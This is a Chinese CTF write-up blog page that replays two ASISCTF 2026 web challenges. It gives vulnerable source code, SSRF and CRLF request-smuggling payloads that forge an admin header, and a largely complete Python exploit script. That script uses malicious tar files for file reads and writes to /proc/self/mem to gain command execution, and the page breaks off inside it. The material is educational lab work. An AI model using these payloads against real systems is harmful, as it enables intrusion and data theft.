@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"maz-dev834.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":false,"wrap":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="CTF Player | Binary | Web | Crypto | Pwn">
+<meta property="og:type" content="website">
+<meta property="og:title" content="maz-dev834">
+<meta property="og:url" content="https://maz-dev834.github.io/index.html">
+<meta property="og:site_name" content="maz-dev834">
+<meta property="og:description" content="CTF Player | Binary | Web | Crypto | Pwn">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="maz-dev834">
+<meta property="article:tag" content="CTF, Security, Pwn, Reverse, Crypto, Web">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://maz-dev834.github.io/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>maz-dev834</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">maz-dev834</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF Writeup | Security Research</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="maz-dev834"
+      src="https://github.com/maz-dev834.png">
+  <p class="site-author-name" itemprop="name">maz-dev834</p>
+  <div class="site-description" itemprop="description">CTF Player | Binary | Web | Crypto | Pwn</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/maz-dev834" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;maz-dev834" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://maz-dev834.github.io/2026/02/27/ASISCTF%202026%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://github.com/maz-dev834.png">
+      <meta itemprop="name" content="maz-dev834">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="maz-dev834">
+      <meta itemprop="description" content="CTF Player | Binary | Web | Crypto | Pwn">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | maz-dev834">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/02/27/ASISCTF%202026%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-02-27 16:32:50" itemprop="dateCreated datePublished" datetime="2026-02-27T16:32:50+08:00">2026-02-27</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <hr>
+<p>title: ASISCTF 2026题目复现<br>date: 2026-02-27<br>categories:  </p>
+<ul>
+<li>Web<br>tags:  </li>
+<li>ASISCTF  </li>
+<li>Web</li>
+</ul>
+<hr>
+<p>以下题目都是基本本地环境进行复现: 比赛期间没做出来 :)</p>
+<h2 id="0x01-ASIS-MAIL"><a href="#0x01-ASIS-MAIL" class="headerlink" title="0x01 ASIS_MAIL"></a>0x01 ASIS_MAIL</h2><p>题目提供了完整的源码<br>![[Pasted image 20260130144858.png]]</p>
+<p>api中是一个go程序<br>sso是一个nodejs写的登录auth认证代码<br>objectstore是一个自己写的bucket</p>
+<p>初始通过AI分析代码</p>
+<h3 id="题型判定与前提假设"><a href="#题型判定与前提假设" class="headerlink" title="题型判定与前提假设"></a>题型判定与前提假设</h3><ul>
+<li>题型：源码审计 + 靶场&#x2F;容器</li>
+<li>前提：你能访问前端暴露的 8081，并通过反向代理访问 objectstore 的 &#x2F;files&#x2F; 入口。</li>
+</ul>
+<p>##漏洞点与成因</p>
+<ol>
+<li>ObjectStore 目录穿越读取<br>objectstore 对对象路径直接拼接，不做路径规范化；同时只根据 bucket &#x3D;&#x3D; “FLAG” 做权限判断，因此可用 ..&#x2F;FLAG&#x2F;… 绕过。</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">@app.route(&quot;&#x2F;&lt;bucket&gt;&#x2F;&lt;path:object_name&gt;&quot;, methods&#x3D;[&quot;PUT&quot;, &quot;GET&quot;, &quot;DELETE&quot;])
+@require_auth
+def object_ops(bucket, object_name, is_admin&#x3D;False):
+    bucket_dir &#x3D; STORAGE &#x2F; bucket
+    bucket_dir.mkdir(parents&#x3D;True, exist_ok&#x3D;True)
+    obj_path &#x3D; bucket_dir &#x2F; object_name
+    ...
+    elif request.method &#x3D;&#x3D; &quot;GET&quot;:
+        if not obj_path.exists():
+            return jsonify(&#123;&quot;error&quot;:&quot;not found&quot;&#125;), 404
+        if bucket &#x3D;&#x3D; &quot;FLAG&quot; and is_admin is False:
+            return jsonify(&#123;&quot;error&quot;:&quot;forbidden&quot;&#125;), 403
+        return send_file(obj_path, as_attachment&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="2">
+<li>公共下载端点可直接访问</li>
+</ol>
+<p>Nginx 对 &#x2F;files&#x2F; 直接反代到 objectstore，没有鉴权。</p>
+<pre class="line-numbers language-none"><code class="language-none">    location &#x2F;files&#x2F; &#123;
+      proxy_pass http:&#x2F;&#x2F;obj_up&#x2F;;
+      proxy_set_header Host $host;
+    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<ol start="3">
+<li><p>flag 文件名是 md5(内容) 派生<br>objectstore 启动时将 flag.txt 重命名为 flag-<md5>.txt。</p>
+</li>
+<li><p>存在一个SSRF点 &#x2F;api&#x2F;compose</p>
+</li>
+</ol>
+<p>所以如果已知文件名称可以使用poc, 直接读取flag</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;api&#x2F;compose HTTP&#x2F;1.1
+Host: 192.168.126.131:8081
+Authorization: Bearer 735ffc48-67d2-4841-9829-13f8c68dfe71
+Accept-Language: en-US;q&#x3D;0.9,en;q&#x3D;0.8
+Connection: close
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 307
+
+
+xml&#x3D;&lt;message&gt;
+&lt;to&gt;u1@asismail.local&lt;&#x2F;to&gt;
+&lt;subject&gt;3-list&lt;&#x2F;subject&gt;
+&lt;body&gt;2&lt;&#x2F;body&gt;
+&lt;attachment_url&gt;http:&#x2F;&#x2F;objectstore:8082&#x2F;public&#x2F;3&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;data&#x2F;FLAG&#x2F;flag-f18b815262ce4ba0627a2fd21e7fa3b4.txt&lt;&#x2F;attachment_url&gt;
+&lt;&#x2F;message&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但是线上的环境是不同的, 所以需要列目录拿到文件名.</p>
+<pre class="line-numbers language-none"><code class="language-none">def require_auth(f):
+    @wraps(f)
+    def wrapper(*args, **kwargs):
+        user_id &#x3D; request.headers.get(&quot;X-User-Id&quot;, &quot;&quot;)
+        if not user_id:
+            return jsonify(&#123;&quot;error&quot;:&quot;authorization required&quot;&#125;), 401
+        is_admin &#x3D; user_id &#x3D;&#x3D; &quot;999&quot;
+        kwargs.update(&#123;&quot;is_admin&quot;: is_admin&#125;)
+        return f(*args, **kwargs)
+    return wrapper
+    
+@app.route(&quot;&#x2F;&lt;bucket&gt;&quot;, methods&#x3D;[&quot;GET&quot;, &quot;POST&quot;])
+@require_auth
+def bucket_ops(bucket, is_admin&#x3D;False):
+    bucket_dir &#x3D; STORAGE &#x2F; bucket
+    bucket_dir.mkdir(parents&#x3D;True, exist_ok&#x3D;True)
+    if request.method &#x3D;&#x3D; &quot;GET&quot;:
+        if bucket &#x3D;&#x3D; &quot;FLAG&quot; and is_admin is False:
+            return jsonify(&#123;&quot;error&quot;:&quot;forbidden&quot;&#125;), 403
+        # list query ?list&#x3D;1
+        listing &#x3D; []
+        for p in bucket_dir.rglob(&#39;*&#39;):
+            if p.is_file():
+                rel &#x3D; p.relative_to(bucket_dir)
+                listing.append(str(rel))
+        return jsonify(&#123;&quot;bucket&quot;: bucket, &quot;objects&quot;: listing&#125;)
+    elif request.method &#x3D;&#x3D; &quot;POST&quot;:
+        # multipart upload form field &#39;file&#39;
+        if &#39;file&#39; not in request.files:
+            return jsonify(&#123;&quot;error&quot;:&quot;no file&quot;&#125;), 400
+        f &#x3D; request.files[&#39;file&#39;]
+        filename &#x3D; str(uuid4()) # f.filename
+        dest &#x3D; bucket_dir &#x2F; filename
+        f.save(dest)
+        return jsonify(&#123;&quot;bucket&quot;: bucket, &quot;key&quot;: filename, &quot;url&quot;: f&quot;&#x2F;public&#x2F;&#123;bucket&#125;&#x2F;&#123;filename&#125;&quot;&#125;), 201<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>只要为get请求就可以列出目录 if bucket &#x3D;&#x3D; “FLAG” and is_admin is False但是如果这两个条件都被满足就403. 注意require_auth 需要从头部获取X-User-Id为999 但是nginx中配置了</p>
+<pre class="line-numbers language-none"><code class="language-none">if ($http_x_user_id !&#x3D; &quot;&quot;) &#123;
+        return 400;
+    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>无法从web前端&#x2F;files&#x2F;FLAG?list去设置头. 没思路了, 继续去分析go api程序</p>
+<p>二进制里出现了 http+post:&#x2F;&#x2F;download.bin，说明可能支持“POST 方式下载”（常见于 go-getter）。<br>发现attachment_url还支持http+post:&#x2F;&#x2F; 去请求<br>测试：attachment_url 是否支持 http+post:&#x2F;&#x2F;，以及是否带头。<br>测试结果: http+post:&#x2F;&#x2F; 是被支持并且存在crlf</p>
+<p>所以直接尝试</p>
+<pre class="line-numbers language-none"><code class="language-none">curl -s -X POST http:&#x2F;&#x2F;192.168.126.131:8081&#x2F;api&#x2F;compose \
+  -H &quot;Authorization: Bearer &lt;token&gt;&quot; \
+  -F &quot;xml&#x3D;&lt;message&gt;
+        &lt;to&gt;u1@asismail.local&lt;&#x2F;to&gt;
+        &lt;subject&gt;list-flag&lt;&#x2F;subject&gt;
+        &lt;body&gt;1&lt;&#x2F;body&gt;
+        &lt;attachment_url&gt;http+post:&#x2F;&#x2F;objectstore:8082&#x2F;FLAG?list&#x3D;1%0d%0aX-User-Id:%20999%0d%0a&lt;&#x2F;attachment_url&gt;
+      &lt;&#x2F;message&gt;&quot;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>但是有个蛋疼的点就是如果发送POST请求,直接就进入了elif request.method &#x3D;&#x3D; “POST”:的流程.(然后卡住了).</p>
+<p>二更:<br>其实这个思路一更得时候已经尝试过了 并没有成功. 现在发现是少了个换行 :)</p>
+<p>漏洞利用思路<br>利用 attachment_url 构造带 %0d%0a 的 rawTarget<br>通过 request smuggling 插入第二个请求：</p>
+<p>Payload 1：列目录</p>
+<pre class="line-numbers language-none"><code class="language-none">http+post:&#x2F;&#x2F;objectstore:8082&#x2F;FLAG?list&#x3D;1 HTTP&#x2F;1.1\r\n
+Host: objectstore:8082\r\n
+X-User-Id: 999\r\n
+\r\n
+GET &#x2F;FLAG?list&#x3D;1 HTTP&#x2F;1.1\r\n
+Host: objectstore:8082\r\n
+X-User-Id: 999\r\n
+\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>URL 编码版本：</p>
+<pre class="line-numbers language-none"><code class="language-none">http+post:&#x2F;&#x2F;objectstore:8082&#x2F;FLAG?list&#x3D;1%20HTTP&#x2F;1.1%0d%0aHost:%20objectstore:8082%0d%0aX-User-Id:%20999%0d%0a%0d%0aGET%20&#x2F;FLAG?list&#x3D;1%20HTTP&#x2F;1.1%0d%0aHost:%20objectstore:8082%0d%0aX-User-Id:%20999%0d%0a%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>返回：<br>{“bucket”:”FLAG”,”objects”:[“flag-<md5>.txt”]}</p>
+<p>Payload 2：读取文件<br>把 <md5> 替换成真实文件名：</p>
+<pre class="line-numbers language-none"><code class="language-none">[http+post:&#x2F;&#x2F;objectstore:8082&#x2F;FLAG?list&#x3D;1%20HTTP&#x2F;1.1%0d%0aHost:%20objectstore:8082%0d%0aX-User-Id:%20999%0d%0a%0d%0aGET%20&#x2F;FLAG&#x2F;flag-&lt;md5&gt;.txt%20HTTP&#x2F;1.1%0d](http+post:&#x2F;&#x2F;objectstore:8082&#x2F;FLAG?list&#x3D;1%20HTTP&#x2F;1.1%0d%0aHost:%20objectstore:8082%0d%0aX-User-Id:%20999%0d%0a%0d%0aGET%20&#x2F;FLAG&#x2F;flag-&lt;md5&gt;.txt%20HTTP&#x2F;1.1%0d%0aHost:%20objectstore:8082%0d%0aX-User-Id:%20999%0d%0a%0d%0a)
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h2 id="0x02-Gemviewer"><a href="#0x02-Gemviewer" class="headerlink" title="0x02 Gemviewer"></a>0x02 Gemviewer</h2><p>题目非常简单</p>
+<pre class="line-numbers language-none"><code class="language-none">from flask import Flask, abort, request
+import tempfile
+import tarfile
+import gzip
+import os
+
+app &#x3D; Flask(__name__)
+
+@app.route(&quot;&#x2F;&quot;)
+def index():
+    return &quot;&quot;&quot;&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Ruby Gems Viewer&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;
+&lt;body&gt;
+&lt;h1&gt;Ruby Gems Metadata Viewer&lt;&#x2F;h1&gt;
+&lt;form method&#x3D;&#39;POST&#39; action&#x3D;&#39;&#x2F;upload&#39; enctype&#x3D;&#39;multipart&#x2F;form-data&#39;&gt;
+&lt;input type&#x3D;&#39;file&#39; name&#x3D;&#39;file&#39; accept&#x3D;&#39;.gem&#39;&#x2F;&gt;
+&lt;input type&#x3D;&#39;submit&#39; value&#x3D;&#39;Upload&#39;&#x2F;&gt;
+&lt;&#x2F;form&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;&quot;&quot;&quot;
+
+@app.route(&quot;&#x2F;upload&quot;, methods&#x3D;[&quot;POST&quot;])
+def upload_file():
+    if &#39;file&#39; not in request.files:
+        abort(400, description&#x3D;&quot;No file part in the request&quot;)
+
+    file &#x3D; request.files[&#39;file&#39;]
+
+    if file.filename &#x3D;&#x3D; &#39;&#39;:
+        abort(400, description&#x3D;&quot;No selected file&quot;)
+
+    try:
+        # .gem files are tar archives containing metadata.gz and data.tar.gz
+        with tarfile.open(fileobj&#x3D;file, mode&#x3D;&#39;r:*&#39;) as gem_tar:
+            with tempfile.TemporaryDirectory() as temp_dir:
+                gem_tar.extractall(path&#x3D;temp_dir,)
+
+                metadata_path &#x3D; os.path.join(temp_dir, &#39;metadata.gz&#39;)
+                if os.path.exists(metadata_path):
+                    try:
+                        with gzip.open(metadata_path, &#39;rt&#39;) as gz:
+                            metadata_content &#x3D; gz.read()
+                    except OSError:
+                        raw_data &#x3D; open(metadata_path, &#39;rb&#39;).read()
+                        abort(400, description&#x3D;&quot;Failed to decompress metadata.gz. The raw data is: &quot; + repr(raw_data))
+                    return f&quot;&quot;&quot;&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Gem Metadata&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;
+&lt;body&gt;
+&lt;h1&gt;Gem Metadata&lt;&#x2F;h1&gt;
+&lt;pre&gt;&#123;metadata_content&#125;&lt;&#x2F;pre&gt;
+&lt;a href&#x3D;&quot;&#x2F;&quot;&gt;Back&lt;&#x2F;a&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;&quot;&quot;&quot;
+
+                return &quot;No metadata.gz found in gem file&quot;
+    except tarfile.TarError as e:
+        abort(400, description&#x3D;&quot;Invalid gem file: &quot; + str(e))
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>docker-compose.yml</p>
+<pre class="line-numbers language-none"><code class="language-none">services:
+  eztar:
+    build: .
+    ports:
+      - &quot;5000:5000&quot;
+    user: &quot;nobody&quot;
+    read_only: true
+    tmpfs:
+      - &#x2F;tmp:mode&#x3D;1777,size&#x3D;64m
+    environment:
+      - TMPDIR&#x3D;&#x2F;tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>dockerfile</p>
+<pre class="line-numbers language-none"><code class="language-none">FROM python:3.13.3-alpine
+
+WORKDIR &#x2F;app
+
+RUN apk update &amp;&amp; apk add build-base &amp;&amp; rm -rf &#x2F;var&#x2F;cache&#x2F;apk&#x2F;*
+RUN pip install --no-cache-dir flask gunicorn
+
+COPY app.py &#x2F;app&#x2F;
+
+RUN chmod 444 &#x2F;app&#x2F;app.py &amp;&amp; \
+    chmod 555 &#x2F;app &amp;&amp; \
+    chown -R root:root &#x2F;app
+
+RUN echo &quot;flag&#123;fake&#125;&quot; &gt; &#x2F;flag
+RUN chmod 0400 &#x2F;flag
+COPY readflag.c &#x2F;readflag.c
+RUN gcc &#x2F;readflag.c -o &#x2F;readflag
+RUN chmod 4755 &#x2F;readflag
+
+USER nobody
+
+EXPOSE 5000
+
+CMD [&quot;gunicorn&quot;, &quot;--bind&quot;, &quot;0.0.0.0:5000&quot;, &quot;app:app&quot;]
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>从tarfile来看存在明显的任意文件读取, 但是这样一个容器怎么样才能拿到flag呢</p>
+<p>对此只能说 ai来:<br>利用链</p>
+<ol>
+<li><strong>LFI Oracle：</strong> tar symlink <code>metadata.gz -&gt; /proc/self/maps</code> 泄露内存映射。</li>
+<li><strong>计算基址：</strong> 定位 <code>libpython3.13.so</code> 与 <code>ld-musl</code> 基址。</li>
+<li><strong>稀疏写 <code>/proc/self/mem</code>：</strong> 构造 GNU sparse tar 在指定地址写入。</li>
+<li><strong>篡改分配器：</strong> 覆盖 <code>_PyRuntime.allocators</code>，把 <code>malloc</code> 重定向到 <code>system</code>。</li>
+<li><strong>触发执行：</strong> 下一次分配即 <code>system(cmd)</code>。</li>
+<li><strong>读取 flag：</strong> 运行 <code>/readflag --give-me-the-f|ag &gt; /tmp/flag</code>，再 LFI 读 <code>/tmp/flag</code>。</li>
+</ol>
+<p>python脚本</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python3
+import io
+import os
+import tarfile
+import gzip
+import struct
+import time
+import requests
+import html
+import ast
+
+BASE_URL &#x3D; os.environ.get(&quot;GEMVIEWER_URL&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:5000&quot;)
+UPLOAD_URL &#x3D; f&quot;&#123;BASE_URL&#125;&#x2F;upload&quot;
+
+# Offsets from writeup (may need adjustment if binary differs)
+PYRUNTIME_OFF &#x3D; 0x5547e0
+OBJ_CTX_OFF &#x3D; 0x310
+OBJ_MALLOC_OFF &#x3D; 0x318
+DEBUG_STORAGE_OFF &#x3D; 0x338
+SYSTEM_OFF &#x3D; 0x5bb7e
+
+SESSION &#x3D; requests.Session()
+
+
+def make_symlink_gem(out_path: str, target: str) -&gt; None:
+    link &#x3D; tarfile.TarInfo(&quot;metadata.gz&quot;)
+    link.type &#x3D; tarfile.SYMTYPE
+    link.linkname &#x3D; target
+    link.size &#x3D; 0
+    with tarfile.open(out_path, &quot;w&quot;) as tf:
+        tf.addfile(link, None)
+
+
+def make_basic_gem(out_path: str, text: bytes &#x3D; b&quot;ping&quot;) -&gt; None:
+    buf &#x3D; io.BytesIO()
+    with gzip.GzipFile(fileobj&#x3D;buf, mode&#x3D;&quot;wb&quot;) as gz:
+        gz.write(text)
+    data &#x3D; buf.getvalue()
+    ti &#x3D; tarfile.TarInfo(&quot;metadata.gz&quot;)
+    ti.size &#x3D; len(data)
+    with tarfile.open(out_path, &quot;w&quot;) as tf:
+        tf.addfile(ti, io.BytesIO(data))
+
+
+def make_sparse_mem_gem(out_path: str, writes: list[tuple[int, bytes]]) -&gt; None:
+    # writes: list of (address, data) to write into &#x2F;proc&#x2F;self&#x2F;mem
+    sparse_map &#x3D; []
+    data_stream &#x3D; io.BytesIO()
+    total_size &#x3D; 0
+    for addr, data in writes:
+        sparse_map.append((addr, len(data)))
+        data_stream.write(data)
+        total_size &#x3D; max(total_size, addr + len(data))
+
+    ti &#x3D; tarfile.TarInfo(&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;mem&quot;)
+    # Keep size small to avoid truncate(EFBIG) on &#x2F;proc&#x2F;self&#x2F;mem
+    ti.size &#x3D; data_stream.tell()
+    ti.mtime &#x3D; int(time.time())
+    # Avoid huge truncate() on &#x2F;proc&#x2F;self&#x2F;mem: keep sparse size small.
+    ti.pax_headers &#x3D; &#123;
+        &quot;GNU.sparse.map&quot;: &quot;,&quot;.join(str(x) for pair in sparse_map for x in pair),
+        &quot;GNU.sparse.size&quot;: str(data_stream.tell()),
+    &#125;
+    data_stream.seek(0)
+    with tarfile.open(out_path, &quot;w&quot;, format&#x3D;tarfile.PAX_FORMAT) as tf:
+        tf.addfile(ti, data_stream)
+
+
+def upload(path: str) -&gt; str:
+    with open(path, &quot;rb&quot;) as f:
+        r &#x3D; SESSION.post(UPLOAD_URL, files&#x3D;&#123;&quot;file&quot;: f&#125;, timeout&#x3D;20)
+    return r.text
+
+
+def lfi_read(target: str) -&gt; bytes:
+    tmp_path &#x3D; &quot;&#x2F;tmp&#x2F;lfi.gem&quot;
+    make_symlink_gem(tmp_path, target)
+    text &#x3D; upload(tmp_path)
+    marker &#x3D; &quot;Failed to decompress metadata.gz. The raw data is: &quot;
+    if marker in text:
+        raw &#x3D; text.split(marker, 1)[1]
+        raw &#x3D; raw.split(&quot;&lt;&#x2F;p&gt;&quot;, 1)[0]
+        raw &#x3D; html.unescape(raw)
+        # raw should be like: b&#39;...&#39;
+        try:
+            return ast.literal_eval(raw)
+        except Exception:
+            return raw.encode(&quot;utf-8&quot;)
+    return text.encode(&quot;utf-8&quot;)
+
+
+def parse_bases(maps_text: str) -&gt; tuple[int, int]:
+    libpython &#x3D; None
+    ld_musl &#x3D; None
+    for line in maps_text.splitlines():
+        parts &#x3D; line.split()
+        if len(parts) &lt; 3:
+            continue
+        start &#x3D; int(parts[0].split(&quot;-&quot;, 1)[0], 16)
+        file_off &#x3D; int(parts[2], 16)
+        if &quot;libpython&quot; in line and &quot;r-xp&quot; in line:
+            # Use image base, not segment start.
+            libpython &#x3D; start - file_off
+        if &quot;ld-musl&quot; in line and &quot;r-xp&quot; in line:
+            # Use image base, not segment start.
+            ld_musl &#x3D; start - file_off
+    if libpython is None or ld_musl is None:
+        raise RuntimeError(&quot;Failed to find libpython or ld-musl base in maps&quot;)
+    return libpython, ld_musl
+
+
+def exploit():
